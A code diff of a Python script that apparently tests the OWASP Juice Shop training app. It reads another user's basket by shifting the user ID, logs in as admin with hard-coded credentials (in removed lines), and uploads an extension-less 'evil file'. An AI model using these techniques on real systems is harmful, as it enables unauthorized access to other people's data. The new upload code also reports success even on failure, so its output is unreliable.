@@ -116,7 +116,7 @@ def access_another_user_basket(server, session):
         targetid = current_user_id + 1
     else:
         targetid = current_user_id - 1
-    basket = session.get("{}/{}".format(get_basket_url(server), targetid))
+    basket = session.get(f"{get_basket_url(server)}/{targetid}")
     if not basket.ok:
         print(f"Error accessing basket {targetid} as {current_user_email}")
     else:
@@ -176,7 +176,7 @@ def check_for_data_leakage(url):
         }
 
 
-def test_file_upload(url, filepath, form_field_name="file"):
+def test_file_upload(server, session, filepath):
     """
     Attempts to upload a file to the given URL using an authenticated session.
 
@@ -184,42 +184,13 @@ def test_file_upload(url, filepath, form_field_name="file"):
     :param filepath: The path to the file to be uploaded.
     :param form_field_name: The name of the form field used for the file upload.
     """
-    session = requests.Session()
-    jsurl = f"{url}/rest/user/login"
-    file_upload_url = f"{url}/file-upload"
-
-    auth_payload = json.dumps({"email": "admin@juice-sh.op", "password": "whocares"})
-
-    login_response = session.post(
-        jsurl, headers={"Content-Type": "application/json"}, data=auth_payload
-    )
-    if not login_response.ok:
-        return {
-            "url": url,
-            "status_code": login_response.status_code,
-            "message": "Failed to log in. Check credentials and URL.",
-        }
-
-    try:
-        with open(filepath, "rb") as infile:
-            files = {
-                form_field_name: ("filename.ext", infile, "application/octet-stream")
-            }
-            upload_response = session.post(file_upload_url, files=files)
-            if upload_response.ok:
-                return {
-                    "url": file_upload_url,
-                    "status_code": upload_response.status_code,
-                    "message": f"File '{filepath}' was successfully uploaded.",
-                }
-            else:
-                return {
-                    "url": file_upload_url,
-                    "status_code": upload_response.status_code,
-                    "message": f"Failed to upload '{filepath}'. Server responded with status code: {upload_response.status_code}",
-                }
-    except Exception as e:
-        return {"url": file_upload_url, "message": f"Error during file upload: {e}"}
+    with open(filepath, "rb") as infile:
+        files = {"file": ("whatever", infile, "application/json")}
+        print("Uploading 150kb file without a file extension..."),
+        upload = session.post(f"{server}/file-upload", files=files)
+        if not upload.ok:
+            print("Error uploading file.\n")
+        print("Successfully uploaded an evil file!\n")
 
 
 def analyze_logs(log_file_path, search_terms):
